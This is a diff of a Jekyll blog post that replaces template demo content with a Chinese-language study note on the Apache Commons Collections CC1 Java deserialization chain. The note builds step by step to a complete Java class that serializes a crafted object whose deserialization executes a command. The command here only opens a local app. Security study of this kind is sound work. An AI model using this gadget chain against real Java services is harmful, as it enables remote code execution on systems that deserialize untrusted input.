@@ -10,86 +10,230 @@ mathjax: true
 author: Bill Smith
 ---
 
-{: .box-success}
-This is a demo post to show you how to write blog posts with markdown.  I strongly encourage you to [take 5 minutes to learn how to write in markdown](https://markdowntutorial.com/) - it'll teach you how to transform regular text into bold/italics/tables/etc.<br/>I also encourage you to look at the [code that created this post](https://raw.githubusercontent.com/daattali/beautiful-jekyll/master/_posts/2020-02-28-sample-markdown.md) to learn some more advanced tips about using markdown in Beautiful Jekyll.
+# CC1
 
-**Here is some bold text**
+## CC1-1
 
-## Here is a secondary heading
+**反序列化方法deserialize**
 
-[This is a link to a different site](https://deanattali.com/) and [this is a link to a section inside this page](#local-urls).
+**->AnnotationInvocationHandler.readobject()**
 
-Here's a table:
+**->setValue()-> checkSetValue()->transform()**
 
-| Number | Next number | Previous number |
-| :------ |:--- | :--- |
-| Five | Six | Four |
-| Ten | Eleven | Nine |
-| Seven | Eight | Six |
-| Two | Three | One |
+InvokerTransformer的transform方法实现了反射，可以调用任意方法，类为传入的input参数
 
-You can use [MathJax](https://www.mathjax.org/) to write LaTeX expressions. For example:
-When \\(a \ne 0\\), there are two solutions to \\(ax^2 + bx + c = 0\\) and they are $$x = {-b \pm \sqrt{b^2-4ac} \over 2a}.$$
+![image-20250217164602236](https://blogandnotebucket.oss-cn-hangzhou.aliyuncs.com/blog/20250217164602280.png)
 
-How about a yummy crepe?
+且方法名、参数类型和参数值在构造方法中赋值，可控
 
-![Crepe](https://beautifuljekyll.com/assets/img/crepe.jpg)
+![image-20250217170114241](https://blogandnotebucket.oss-cn-hangzhou.aliyuncs.com/blog/20250217170114341.png)
 
-It can also be centered!
+可以初始化一个InvokerTransformer类对象，调用transform方法
 
-![Crepe](https://beautifuljekyll.com/assets/img/crepe.jpg){: .mx-auto.d-block :}
+首先，我们直接使用反射去调用Runtime的exec方法来执行命令是这样的
 
-Here's a code chunk:
-
-~~~
-var foo = function(x) {
-  return(x + 5);
-}
-foo(3)
-~~~
-
-And here is the same code with syntax highlighting:
-
-```javascript
-var foo = function(x) {
-  return(x + 5);
-}
-foo(3)
+```JAVA
+Runtime runtime = Runtime.getRuntime();
+Class runtimeClass=runtime.getClass();
+Method execMethod=runtimeClass.getMethod("exec", String.class);
+execMethod.invoke(runtime,"open /Applications/NeteaseMusic.app");
 ```
 
-And here is the same code yet again but with line numbers:
+成功弹出app
 
-{% highlight javascript linenos %}
-var foo = function(x) {
-  return(x + 5);
+![image-20250217171517418](https://blogandnotebucket.oss-cn-hangzhou.aliyuncs.com/blog/20250217171517455.png)
+
+利用InvokerTransformer来调用，先初始化一个InvokerTransformer对象，传入方法名为要调用的方法exec，参数类型为字符串（Class[]格式），参数值即要执行的命令，再调用初始化InvokerTransformer对象的transform方法，传入的参数为要反射调用的类
+
+```java
+Runtime runtime = Runtime.getRuntime();
+new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"open /Applications/NeteaseMusic.app"}).transform(runtime);
+```
+
+使得transform的反射接收参数后变为
+
+```java
+Class cls = runtime.getClass();
+Method method = cls.getMethod(exec, new Class[]{String.class});
+return method.invoke(runtime, new Object[]{"open /Applications/NeteaseMusic.app"});
+```
+
+![image-20250217202812452](https://blogandnotebucket.oss-cn-hangzhou.aliyuncs.com/blog/20250217202812563.png)
+
+然后我们需要再往上找，看哪里可以调用InvokerTransformer的transform方法，因为反序列化会走到他的readObject方法中，所以我们的调用链是从readobject开始逐步走到InvokerTransformer的transform方法中
+
+寻找InvokerTransformer的transform的上层调用点时，发现了TransformMap类，它的checkSetValue方法调用了transform
+
+![image-20250217210546525](https://blogandnotebucket.oss-cn-hangzhou.aliyuncs.com/blog/20250217210546568.png)
+
+而他的valueTransformer在构造函数中被赋值，因为构造方法为`protected`方法
+
+![image-20250217210646013](https://blogandnotebucket.oss-cn-hangzhou.aliyuncs.com/blog/20250217210646056.png)
+
+需要用decorate方法来调用构造方法，因为checkSetValue调用transform方法只用到了valueTransformer，所以第一个参数只需要传入一个空的map，第二个参数传入一个null即可
+
+![image-20250217210814726](https://blogandnotebucket.oss-cn-hangzhou.aliyuncs.com/blog/20250217210814774.png)
+
+再往上找哪里调用了checkSetValue方法，发现在AbstractInputCheckedMapDecorator抽象类中MapEntry类的setValue方法里调用到了，而AbstractInputCheckedMapDecorator抽象类为TransformMap的父类
+
+![image-20250217213101405](https://blogandnotebucket.oss-cn-hangzhou.aliyuncs.com/blog/20250217213101447.png)
+
+![image-20250217213219150](https://blogandnotebucket.oss-cn-hangzhou.aliyuncs.com/blog/20250217213219196.png)
+
+所以我们可以通过entry来调用他的setValue方法，遍历一个map，获取entry，再调用entry的setValue方法
+
+map不能为空，可先给一对任意键值对
+
+```java
+				Runtime runtime = Runtime.getRuntime();
+        InvokerTransformer invokerTransformer= new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"open /Applications/NeteaseMusic.app"});
+        HashMap Map = new HashMap();
+        Map<Object,Object> transformedMap = TransformedMap.decorate(Map,null,invokerTransformer);
+        Map.put("aaa","bbb");
+        for (Map.Entry entry:transformedMap.entrySet())
+        {
+            entry.setValue(Runtime.getRuntime());
+        }
+```
+
+成功弹出
+
+![image-20250217214119103](https://blogandnotebucket.oss-cn-hangzhou.aliyuncs.com/blog/20250217214119142.png)
+
+Runtime是一个不可反序列化的类，但是Runtime.class可以，因为class类可发序列化
+
+![image-20250217221429789](https://blogandnotebucket.oss-cn-hangzhou.aliyuncs.com/blog/20250217221429835.png)
+
+这里我们可以直接使用InvokerTransformer来反射调用Runtime，成功弹出app
+
+```java
+Method getRuntime =(Method) new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}).transform(Runtime.class);
+Runtime currentRuntime = (Runtime) new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}).transform(getRuntime);
+new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"open /Applications/NeteaseMusic.app"}).transform(currentRuntime);
+```
+
+![image-20250217221609057](https://blogandnotebucket.oss-cn-hangzhou.aliyuncs.com/blog/20250217221609129.png)
+
+然后我们来看chainedTransformer类，它的transform方法传入的参数是一个数组时，会调用每一个参数的transform方法，前一个参数调用tranform的返回值会作为下一个参数调用transform的参数
+
+![image-20250217203624746](https://blogandnotebucket.oss-cn-hangzhou.aliyuncs.com/blog/20250217203624785.png)
+
+可以使用chainedTransformer将上面三部分InvokerTransformer来反射调用Runtime包裹起来，再调用transform
+
+```java
+ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{
+        new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
+        new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
+        new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"open /Applications/NeteaseMusic.app"})
+});
+chainedTransformer.transform(Runtime.class);
+```
+
+![37B0628D-DADF-418E-BD3B-2587B0D95BF7](https://blogandnotebucket.oss-cn-hangzhou.aliyuncs.com/blog/20250217222007063.png)
+
+```java
+ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{
+                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
+                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
+                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"open /Applications/NeteaseMusic.app"})
+        });
+//        chainedTransformer.transform(Runtime.class);
+        HashMap Map = new HashMap();
+        Map<Object,Object> transformedMap = TransformedMap.decorate(Map,null,chainedTransformer);
+        Map.put("aaa","bbb");
+        for (Map.Entry entry:transformedMap.entrySet())
+        {
+            entry.setValue(Runtime.class);
+        }
+```
+
+![image-20250217222513068](https://blogandnotebucket.oss-cn-hangzhou.aliyuncs.com/blog/20250217222513185.png)
+
+我们最后要找一个readobject去实现，然后发现AnnotationInvocationHandler的readObject方法中遍历了一个map，并调用了它entry的setValue方法，但此时，setValue方法的参数不可控
+
+![image-20250217214421270](https://blogandnotebucket.oss-cn-hangzhou.aliyuncs.com/blog/20250217214421311.png)
+
+这时候我们可以来看ConstantTransformer的transform方法，无论传入的参数为什么，返回值始终为iConstant，而iConstant在构造方法中赋值
+
+![image-20250217214642496](https://blogandnotebucket.oss-cn-hangzhou.aliyuncs.com/blog/20250217214642540.png)
+
+所以直接将ConstantTransformer添加到传入ChainedTransformer的数组Transform[]的第一个值
+
+ConstantTransformer(Runtime.class)调用transform的返回值为Runtime.class，作为参数传入数组第二部分即变为new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}).transform(Runtime.class)，他的返回值传入第三部分，即实现了嵌套使用InvokerTransformer来调用的功能，也解决了AnnotationInvocationHandler的readObject方法调用setValue时参数不可控的问题
+
+发现执行不成功
+
+![image-20250217224244576](https://blogandnotebucket.oss-cn-hangzhou.aliyuncs.com/blog/20250217224244701.png)
+
+进到AnnotationInvocationHandler的readObject方法，有个memberType不等于null判断，这里要看type是什么
+
+![image-20250217224320088](https://blogandnotebucket.oss-cn-hangzhou.aliyuncs.com/blog/20250217224320168.png)
+
+type是实例化AnnotationInvocationHandler方法的第一个参数，获取他的成员方法和传入的map的key做对比
+
+![image-20250217224610069](/Users/sine/Library/Application Support/typora-user-images/image-20250217224610069.png)
+
+Target.class有成员变量value，所以要把map的key值改成value
+
+![image-20250217225005683](https://blogandnotebucket.oss-cn-hangzhou.aliyuncs.com/blog/20250217225005774.png)
+
+```java
+package org.example;
+
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.map.TransformedMap;
+
+import java.io.FileInputStream;
+import java.io.FileOutputStream;
+import java.io.ObjectInputStream;
+import java.io.ObjectOutputStream;
+import java.lang.annotation.Target;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.InvocationTargetException;
+import java.lang.reflect.Method;
+import java.util.HashMap;
+import java.util.Map;
+
+public class CC1Test1 {
+
+    public static void main(String[] args) throws Exception {
+        ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
+                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
+                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"open /Applications/NeteaseMusic.app"})
+        });
+        HashMap map = new HashMap();
+        Map<Object,Object> transformedMap = TransformedMap.decorate(map,null,chainedTransformer);
+        map.put("value","bbb");
+        Class AnnotationInvocationHandler = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
+        Constructor AnnotartionConstructer = AnnotationInvocationHandler.getDeclaredConstructor(Class.class,Map.class);
+        AnnotartionConstructer.setAccessible(true);
+        Object o = AnnotartionConstructer.newInstance(Target.class,transformedMap);
+        serialize(o);
+        unserialize("ser.bin");
+
+    }
+
+    public static void serialize(Object obj) throws Exception {
+        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
+        oos.writeObject(obj);
+    }
+
+    public static Object unserialize(String Filename) throws Exception {
+        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
+        Object obj = ois.readObject();
+        return obj;
+    }
+
+
+
 }
-foo(3)
-{% endhighlight %}
+```
 
-## Boxes
-You can add notification, warning and error boxes like this:
+![image-20250217223428712](https://blogandnotebucket.oss-cn-hangzhou.aliyuncs.com/blog/20250217223428827.png)
 
-### Notification
-
-{: .box-note}
-**Note:** This is a notification box.
-
-### Warning
-
-{: .box-warning}
-**Warning:** This is a warning box.
-
-### Error
-
-{: .box-error}
-**Error:** This is an error box.
-
-## Local URLs in project sites {#local-urls}
-
-When hosting a *project site* on GitHub Pages (for example, `https://USERNAME.github.io/MyProject`), URLs that begin with `/` and refer to local files may not work correctly due to how the root URL (`/`) is interpreted by GitHub Pages. You can read more about it [in the FAQ](https://beautifuljekyll.com/faq/#links-in-project-page). To demonstrate the issue, the following local image will be broken **if your site is a project site:**
-
-![Crepe](/assets/img/crepe.jpg)
-
-If the above image is broken, then you'll need to follow the instructions [in the FAQ](https://beautifuljekyll.com/faq/#links-in-project-page). Here is proof that it can be fixed:
-
-![Crepe]({{ '/assets/img/crepe.jpg' | relative_url }})
+AnnotationInvocationHandler.readobject()->setValue()-> TransformedMap.checkSetValue()->chainedTransformer.transform->new ConstantTransformer（Runtime.class）->return this.iConstant(Runtime.class)->getMethod(getRuntime)->invoke->exec(“”)
